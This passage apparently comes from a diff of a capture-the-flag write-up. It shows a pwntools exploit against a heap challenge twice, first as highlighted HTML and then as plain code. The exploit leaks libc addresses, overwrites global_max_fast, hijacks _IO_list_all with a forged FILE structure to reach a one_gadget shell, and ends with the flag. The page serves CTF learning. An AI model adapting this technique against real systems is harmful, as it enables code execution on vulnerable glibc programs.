r.recvuntil(<span class="string">'exit\n'</span>)</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'exit\n'</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(cont)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'exit\n'</span>)</span><br><span class="line">    r.sendline(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    r.sendline(cont)</span><br><span class="line"><span class="comment">#step 1:leak elfbase and libc</span></span><br><span class="line">r.recvuntil(<span class="string">'exit\n'</span>)</span><br><span class="line">r.sendline(<span class="string">'666'</span>)</span><br><span class="line">elfbase=int(r.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-0x202040</span></span><br><span class="line">bsscomment=elfbase+<span class="number">0x2020e0</span></span><br><span class="line">success(<span class="string">"elfbase:"</span>+hex(elfbase))</span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">'0'</span>*<span class="number">0xa0</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">'1'</span>*<span class="number">0xa0</span>)<span class="comment">#1</span></span><br><span class="line">fakefile=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(bsscomment<span class="number">-0x18</span>)</span><br><span class="line"><span class="comment">#fakesize=2*(&amp;_IO_list_all-&amp;main_arena+8)-0x10=0x1400</span></span><br><span class="line">fakesize=<span class="number">0x1400</span></span><br><span class="line">add(fakesize,fakefile)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xa0</span>,<span class="string">'2'</span>*<span class="number">7</span>)<span class="comment">#0</span></span><br><span class="line">r.recvuntil(<span class="string">'2'</span>*<span class="number">7</span>+<span class="string">'\n'</span>)</span><br><span class="line">leak=u64(r.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">"leak:"</span>+hex(leak))</span><br><span class="line">lbase=leak<span class="number">-0x7ffff7dd1b78</span>+<span class="number">0x7ffff7a0d000</span></span><br><span class="line">global_max_fast=leak<span class="number">-0x7ffff7dd1b78</span>+<span class="number">0x7ffff7dd37f8</span></span><br><span class="line">_IO_list_all=leak<span class="number">-0x7ffff7dd1b78</span>+<span class="number">0x7ffff7dd2520</span></span><br><span class="line">one=lbase+<span class="number">0x4526a</span></span><br><span class="line">success(<span class="string">"lbase:"</span>+hex(lbase))</span><br><span class="line">success(<span class="string">"maxfast:"</span>+hex(global_max_fast))</span><br><span class="line">success(<span class="string">"io:"</span>+hex(_IO_list_all))</span><br><span class="line"><span class="comment">#step 2:overwrite global_max_fast with big value</span></span><br><span class="line">edit(p64(one)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(global_max_fast))</span><br><span class="line"><span class="comment">#step 3:free fake chunk and change _IO_list_all to fake chunk</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#step 4:call exit and go to _IO_flush_all_lockp</span></span><br><span class="line">r.recvuntil(<span class="string">'exit\n'</span>)</span><br><span class="line">r.sendline(<span class="string">'4'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">from pwn import *
+env=os.environ
+env[&#39;LD_PRELOAD&#39;]=&#39;./heaptrick.so&#39;
+context.log_level=&#39;debug&#39;
+#r=process(&#39;./heaptrick&#39;)
+r=remote(&#39;218.197.154.9&#39;,10003)
+def add(size,cont):
+    r.recvuntil(&#39;exit\n&#39;)
+    r.sendline(&#39;1&#39;)
+    r.recvuntil(&#39;:&#39;)
+    r.sendline(str(size))
+    r.recvuntil(&#39;:&#39;)
+    r.sendline(cont)
+def delete(idx):
+    r.recvuntil(&#39;exit\n&#39;)
+    r.sendline(&#39;2&#39;)
+    r.recvuntil(&#39;:\n&#39;)
+    r.sendline(str(idx))
+def edit(cont):
+    r.recvuntil(&#39;exit\n&#39;)
+    r.sendline(&#39;3&#39;)
+    r.recvuntil(&#39;:&#39;)
+    r.sendline(cont)
+#step 1:leak elfbase and libc
+r.recvuntil(&#39;exit\n&#39;)
+r.sendline(&#39;666&#39;)
+elfbase=int(r.recvline()[:-1],16)-0x202040
+bsscomment=elfbase+0x2020e0
+success(&quot;elfbase:&quot;+hex(elfbase))
+add(0xa0,&#39;0&#39;*0xa0)#0
+add(0xa0,&#39;1&#39;*0xa0)#1
+fakefile=p64(0)*3+p64(1)+p64(0)*21+p64(bsscomment-0x18)
+#fakesize=2*(&amp;_IO_list_all-&amp;main_arena+8)-0x10=0x1400
+fakesize=0x1400
+add(fakesize,fakefile)#2
+delete(0)
+add(0xa0,&#39;2&#39;*7)#0
+r.recvuntil(&#39;2&#39;*7+&#39;\n&#39;)
+leak=u64(r.recvline()[:-1].ljust(8,&#39;\x00&#39;))
+success(&quot;leak:&quot;+hex(leak))
+lbase=leak-0x7ffff7dd1b78+0x7ffff7a0d000
+global_max_fast=leak-0x7ffff7dd1b78+0x7ffff7dd37f8
+_IO_list_all=leak-0x7ffff7dd1b78+0x7ffff7dd2520
+one=lbase+0x4526a
+success(&quot;lbase:&quot;+hex(lbase))
+success(&quot;maxfast:&quot;+hex(global_max_fast))
+success(&quot;io:&quot;+hex(_IO_list_all))
+#step 2:overwrite global_max_fast with big value
+edit(p64(one)+p64(0)*3+p64(global_max_fast))
+#step 3:free fake chunk and change _IO_list_all to fake chunk
+delete(2)
+#step 4:call exit and go to _IO_flush_all_lockp
+r.recvuntil(&#39;exit\n&#39;)
+r.sendline(&#39;4&#39;)
+r.interactive()</code></pre>
 <blockquote>
 <p>WHUCTF{Nice_Heap_Tricks!!!}</p>
 </blockquote>
